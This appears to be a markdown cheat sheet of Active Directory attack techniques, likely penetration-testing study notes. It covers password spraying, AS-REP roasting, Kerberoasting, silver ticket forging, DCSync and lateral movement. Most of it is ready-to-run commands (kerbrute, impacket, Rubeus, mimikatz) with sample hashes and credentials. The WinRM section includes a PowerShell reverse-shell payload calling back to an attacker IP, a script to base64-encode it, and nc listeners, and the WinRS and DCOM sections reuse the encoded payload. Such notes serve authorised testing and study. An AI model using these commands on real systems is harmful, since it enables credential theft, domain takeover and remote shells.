# Active directory authentication attacks

## Password Attacks

### Password spraying (on Windows)
#### Method 1: Use a script on the Windows machine to spray password on all domain accounts
- Prerequisite: 
	- access to the domain (any level) with shell
	- a possible password to spray
- Example of script: https://github.com/dafthack/DomainPasswordSpray/tree/master
#### Method 2: kerbrute (TGT-based verification method)
- Prerequisite:
	- access to the domain (any level) with shell
	- a possible password to spray
	- list of domain users
- `.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`

### Password spraying (from Kali)
- Prerequisite: 
	- know some usernames
	- a possible password to spray
- `crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success`

## AS-REP Roasting
Hash needs to be cracked, cannot pass the hash
#### AS-REP Roasting from Kali with credentials
- Prerequisite:
	- a set of credentials for a domain account
- `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
	- Outputs TGT hashes of all AS-REP roastable accounts in domain
- note: if the hash generated by one tool doesn't work (e.g. hashcat says signature incorrect), try the other tool
#### AS-REP Roasting from Kali without credentials
- Prerequisite:
	- a target account name to roast
- `GetNPUsers.py conda.local/jsmith -dc-ip 192.168.50.70`
	- `jsmith`: the account to roast
	- Outputs TGT hash of the target account
#### AS-REP Roasting from Windows
- Prerequisite:
	- Access to target machine (with shell)
- `.\Rubeus.exe asreproast /nowrap`

## Kerberoast
- Prerequisite:
	- Access to domain required (any level)
- Obtains hash (format: kerberos ticket)
- Note: hash must be cracked to be used. Cannot pass the hash.
### Kerberoasting from Windows
- Prerequisite:
	- Access to target machine (with shell)
- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
### Kerberoasting from Kali
- Prerequisite:
	- Credentials for a domain user
- `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`

## Silver Tickets
Forges a service ticket to access the target resource

### from Windows
- Prerequisite:
	- ~~NTLM hash OR password of target service account~~
	- ~~domain SID~~
	- ~~target SPN~~
	- access to domain (with shell)
	- Administrator access to PowerShell (if no NTLM hash or password of target service account)
- Run mimikatz to extract NTLM hash of target service account:
	`privilege::debug`
	`sekurlsa::logonpasswords`
	(E.g. NTLM hash: `4d28cf5252d39971419580a51484ca09`)
	
	Obtain domain SID:
	`whoami /user` (Domain SID is the bold italic part ***S-1-5-21-1987370270-658905905-1781884369***-1105)

	If have password of service account instead of NTLM hash, generate a hash from the password: https://codebeautify.org/ntlm-hash-generator

	Obtain SPN of the service account:
	`Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames`

	Run mimikatz to inject forged ticket into system memory:
	`kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin` (could use any username, no need password)
	
	Confirm that the ticket was stored in memory:
	`klist` (should see a cached ticket)
	
	Access the target system:
	`iwr -UseDefaultCredentials http://web04`

### from Kali
- Prerequisites:
	- NTLM hash or password of a service account

Run on Kali:
`impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`

From the output, find out which file in current directory the ticket is saved in. (look for output `Saving ticket to Administrator.ccache`, where `Administrator.ccache` is the filename)

Export the variable:
`export KRB5CCNAME=$PWD/Administrator.ccache`

Ensure ticket is added:
`klist`

Create a file `/etc/krb5user.conf`:
```
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]        
        NAGOYA-INDUSTRIES.COM = {
                kdc = nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

Set up `/etc/hosts`:
`127.0.0.1       localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM`

Connect to the target service. Done!

## Domain Controller Synchronization
- Obtain:
	- NTLM hash (and other credential hashes) of any domain user
### Domain Controller Synchronization from Windows
- Prerequisite:
	- Access to session of domain user with rights for DC Sync (redacted)
- Mimikatz:
	`lsadump::dcsync /user:corp\dave`
		- `corp\dave`: user for which we want to obtain creds
### Domain Controller Synchronization from Kali
- Prerequisite:
	- Creds of a domain user with rights for DC Sync (redacted)
- `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`
	- `dave`: target user
	- In output, NTLM hash is:
	  Using the DRSUAPI method to get NTDS.DIT secrets dave:1103:aad3b435b51404eeaad3b435b51404ee:***08d7a47a6f9f66b97b1bae4178747494***:::

# Lateral Movement

## WMI and WinRM
- Obtains:
	- Shell access to adjacent target machine as the target user
### WinRM
- Prerequisites:
	- credentials of a member of the Administrators local group (at the same time can also be a domain user) (of the target machine?)
	- PowerShell access
- Create encoded PowerShell reverse shell payload:
```python
import sys
import base64

payload = '$client = New-Object
System.Net.Sockets.TCPClient("[KALI IP]",[KALI LISTENER PORT]);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " +
base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```

Set up listener on Kali.
	`nc -nvlp 443`
	Run PS script on Windows machine.
	`$username = 'jen';`
	`$password = 'Nexus123!';`
	`$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;`
	`$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;`
	`$Options = New-CimSessionOption -Protocol DCOM`
	`$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options`
	`$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';` (put the generated encoded script here)
	`Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`

### WinRS
- Prerequisite:
	- Credentials of a domain user who is a part of the Administrators or Remote Management Users group on the target host
	- Shell access
- Method 1 - cmd:
	Set up listener on Kali:
	`nc -nvlp 443`
	Run command on cmd:
	`winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"` (put the generated reverse shell payload here)
- Method 2 - PowerShell:
	`$username = 'jen';`
	`$password = 'Nexus123!';`
	`$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;`
	`$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;`
	`New-PSSession -ComputerName 192.168.50.73 -Credential $credential`
	`Enter-PSSession 1`

## PsExec
- Prerequisite:
	- Credentials of a user who is in Administrators local group of target machine
	- ADMIN$ share is available
	- File and Printer Sharing is turned on
	- Shell access
- Obtains:
	- Shell access to adjacent target machine as target user
- `./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd`

## Pass the Hash
- Prerequisite:
	- NTLM hash of a local administrator user on the target machine
- Obtains:
	- Shell access to adjacent target machine as target user (authentication method: NTLM)
- From Kali:
	`/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`
- Note: To use this method on a target machine sitting behind a network, we need to pivot and proxy through the initial compromised host

## Overpass the Hash
- Prerequisite:
	- NTLM hash of a domain user
	- ~~GUI access~~ ?
	- Shell access
- Obtains:
	- access to anything that rely on Kerberos authentication (e.g. PsExec) (authentication method: Kerberos)
	- Ticket Granting Service (TGS) 
		- (technically obtains Ticket Granting Ticket (TGT) first which in turn gets us TGS)
- Mimikatz: (requires GUI access?)
	`sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`
- Can also use Rubeus: (no GUI access required) https://juggernaut-sec.com/over-pass-the-hash-attacks/

## Pass the Ticket
- Prerequisite:
	- Debug privileges
	- Shell access
	- A user with access to the target resource has a session on this machine
- Obtains:
	- Access to a target resource
- Mimikatz:
	`privilege::debug`
	`sekurlsa::tickets /export`
	Identify the extracted ticket(s) in the format of `user@cifs-targetresource.kirbi`:
	`dir *.kirbi`
	Inject ticket with mimikatz:
	`kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi` (filename of the extracted ticket)
	Check that the ticket is in our own session:
	`klist`
	Access the target resource normally.

## DCOM
- Prerequisite:
	- PowerShell shell access (local admin)
- Obtains:
	- Access to target machine
- Run on elevated PowerShell:
	`$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","[IP OF TARGET]"))`
	Set up listener on Kali:
	`nc -nvlp 443`
	Run on elevated PowerShell:
`$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")` (the generated encoded reverse shell payload)

	